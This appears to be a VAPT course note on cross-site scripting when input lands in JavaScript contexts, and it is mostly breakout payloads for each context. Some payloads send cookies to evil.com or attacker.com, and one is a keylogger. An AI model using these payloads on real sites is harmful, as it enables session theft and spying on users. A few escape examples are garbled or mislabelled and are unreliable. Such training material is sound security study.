---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.08 XSS in JavaScript Context"
---

# 07.08 — XSS in JavaScript Context

## What is JavaScript Context?

When user input is embedded directly inside a `<script>` block or JavaScript string, the injection approach differs from HTML context. You need to escape the JavaScript string first, then inject executable code.

```javascript
// VULNERABLE CODE:
<script>
  var username = "USER_INPUT";   // ← input inside JS string
  var id = USER_INPUT_NUMERIC;   // ← input inside JS numeric
  var config = {name: 'USER_INPUT', debug: false};
</script>
```

---

## String Context Injection

### Double-Quoted String

```javascript
// ORIGINAL:
var search = "USER_INPUT";

// INJECT: close the string, execute code, re-open or comment:
";alert(1)//
"-alert(1)-"
";alert(1);"
"-alert(document.domain)-"

// RESULT:
var search = "";alert(1)//";  → valid! alert fires!

// OR break completely:
</script><script>alert(1)</script>
// RESULT: closes script tag, opens new one!
```

### Single-Quoted String

```javascript
// ORIGINAL:
var name = 'USER_INPUT';

// INJECT:
';alert(1)//
'-alert(1)-'
';alert(1)//

// BACKSLASH ESCAPING (if server backslash-escapes quotes):
// Server converts: ' → \'
// INPUT: ' → Server sends: \'
// But: INPUT: \' → Server sends: \\'  ← escaped backslash, then literal quote!
\';alert(1)//
// Result: var name = '\\';alert(1)//'; ← breaks out!
```

### Template Literal (Backtick)

```javascript
// ORIGINAL:
var greeting = `Hello ${USER_INPUT}!`;

// INJECT:
${alert(1)}
`; alert(1)//
${alert`1`}
```

---

## Numeric Context

```javascript
// ORIGINAL:
var id = USER_INPUT;  // no quotes!

// INJECT (no need to escape quotes):
1;alert(1)
1-alert(1)-1
1,alert(1)
(function(){alert(1)}())
```

---

## Inside JSON Assignment

```javascript
// ORIGINAL:
var config = {"username":"USER_INPUT","role":"user"};

// INJECT to break JSON:
","role":"admin","x":"
// RESULT:
var config = {"username":"","role":"admin","x":"","role":"user"};
// JSON parse: role = "admin"!

// OR break out of JS entirely:
</script><script>alert(1)</script>
```

---

## Inside Function Call

```javascript
// ORIGINAL:
setTimeout("USER_INPUT", 1000);
eval("USER_INPUT");

// INJECT (already in execution context!):
alert(1)
fetch('https://evil.com/?c='+document.cookie)
```

---

## Inside HTML Event Handler String

```javascript
// ORIGINAL:
<button onclick="doSomething('USER_INPUT')">Click</button>

// INJECT (HTML attribute → JS string → break out):
');alert(1)//
'); fetch('https://evil.com?c='+document.cookie)//
\x27);alert(1)//
```

---

## Escaping Issues — When Encoding Helps vs Doesn't

```
WHAT SERVERS TYPICALLY ENCODE:
  HTML context: < → &lt;, > → &gt;, " → &quot;
  JS context: ' → \'

WHY ENCODING IN JS CONTEXT MAY NOT WORK:
  var x = "USER_INPUT";
  Input: \"; alert(1)//
  Server escapes \: \\"; alert(1)//
  
  RESULT: var x = "\\"; alert(1)//";
  Wait: \\ is an escaped backslash!
  So: var x = "\\"  → string ends with a backslash
  Then: ; alert(1)//"; → runs as code!
  
  KEY: If server escapes " but not \, then \"+payload works!

ANOTHER BYPASS — HTML ENTITY IN JS:
  In HTML attribute with JS:
  onclick="doSomething(&quot;USER_INPUT&quot;)"
  → Browser HTML-decodes before JS executes
  → So &#x22; = " works to escape!
```

---

## Detecting JavaScript Context

```bash
# SUBMIT CANARY AND VIEW SOURCE:
# canary: xssjstest123

# LOOK FOR CONTEXT IN SOURCE:
grep -A2 "xssjstest123" response.html

# IDENTIFIES:
# var x = "xssjstest123"    → JS double-quote string
# var x = 'xssjstest123'    → JS single-quote string  
# var x = `xssjstest123`    → JS template literal
# var x = xssjstest123      → JS numeric/unquoted
# eval("xssjstest123")      → already in execution context!

# TEST PAYLOADS BASED ON CONTEXT:
# Double-quote string: ";alert(1)//
# Single-quote string: ';alert(1)//
# Template literal: ${alert(1)}
# Numeric/unquoted: ;alert(1)//

# CHECK WHAT CHARACTERS ARE ENCODED:
# " encoded as &quot;? → can't break string with "
# ' encoded as \'? → try \'  (backslash-escaped)
# < encoded as &lt;? → can't close script tag
# Newline allowed? → multiline JS possible
```

---

## Useful JavaScript Payloads for JS Context

```javascript
// PROOF OF CONCEPT:
alert(document.domain)          // shows the origin (important for reports!)
alert(1)
confirm(1)
prompt(1)

// COOKIE THEFT (from JS context):
fetch('https://attacker.com/?c='+document.cookie)
new XMLHttpRequest().open('GET','https://attacker.com/?c='+document.cookie,true)

// KEYLOGGER:
document.onkeypress=e=>fetch('https://attacker.com/k?k='+e.key)

// DECODE: if response is encoded, check with:
// For &#34; = " in attribute context → still injectable via entity!

// JAVASCRIPT ESCAPING (for use within strings):
\x22 = "    ← if " is escaped but \x22 is not
\x27 = '    ← if ' is escaped but \x27 is not
" = "  ← unicode escape
' = '  ← unicode escape

// TEMPLATE:
// If in JS double-quote string: &#x22;;alert(1)//
// Browser HTML-decodes &#x22; to " → breaks string!
```

---

## Angular/React/Vue Template Injection

```javascript
// ANGULAR (server-side template injection via XSS):
{{constructor.constructor('alert(1)')()}}
{{7*7}}   → if shows 49 → Angular SSTI!

// VUE.JS:
{{alert(1)}}  // older Vue (eval-based templates)
// Vue 3 is safer

// REACT:
// React escapes by default — XSS via:
// dangerouslySetInnerHTML → React's explicit "I know what I'm doing"
// If developer uses: <div dangerouslySetInnerHTML={{__html: userInput}} />
// → Stored XSS!
```

---

## Related Notes
- [[04 - DOM-Based XSS]] — client-side JS manipulation
- [[07 - XSS in HTML Attributes]] — attribute context
- [[14 - XSS Filter Bypass Techniques]] — bypassing filters
- [[09 - XSS in CSS Context]] — CSS-based XSS
